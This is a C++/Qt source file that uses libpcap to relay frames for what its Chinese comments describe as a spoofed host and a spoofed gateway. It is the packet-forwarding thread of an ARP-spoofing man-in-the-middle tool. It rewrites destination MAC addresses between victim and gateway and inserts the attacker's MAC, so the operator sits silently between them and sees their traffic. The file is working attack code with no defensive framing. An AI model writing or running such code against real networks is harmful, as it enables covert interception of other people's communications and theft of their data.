#include "sendpktthread.h"

SendPktThread::SendPktThread(pcap_t *adhandle, u_char *currentMac,
                             u_long targetIp, u_char *targetMac,
                             u_long gateIp, u_char *gateMac)
{
    sstopped = false;
    this->adhandle = adhandle;
    this->currentMac = currentMac;
    this->targetIp = targetIp;
    this->targetMac = targetMac;
    this->gateIp = gateIp;
    this->gateMac = gateMac;
}

void SendPktThread::run()
{
    int res = 0;
    u_char *modifyMac = (u_char *)malloc(6 * sizeof(u_char));
    while((sstopped != true) && (res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0)
    {
        if(res == 0)
            continue;
        //以太网帧的头部
        ethhdr *eheader = (ethhdr *)pkt_data;
        //如果以太网帧的源mac地址是被欺骗主机的mac地址，则将目的mac地址改为网关mac地址
        if(memcmp(eheader->src,targetMac,6)==0)
        {
            memcpy(modifyMac, gateMac, 6);
            emit updateShowInfo("将数据包修改发送到网关!");
        }
        //如果以太网帧的源mac地址是被欺骗的路由器的mac地址，则将目的mac地址改为被欺骗主机的mac地址
        else if(memcmp(eheader->src, gateMac, 6)==0)
        {
            memcpy(modifyMac,targetMac,6);
            emit updateShowInfo("将数据包修改发送到目标主机!");
        }
        else
            continue;
        memcpy((u_char *)pkt_data, modifyMac, 6);
        memcpy((u_char *)pkt_data + 6, currentMac, 6);
        pcap_sendpacket(adhandle, (const u_char *)pkt_data, header->caplen);

    }
    free(modifyMac);
}

void SendPktThread::stopimmediate()
{
    QMutexLocker locker(&m_lock);
    sstopped = true;
}
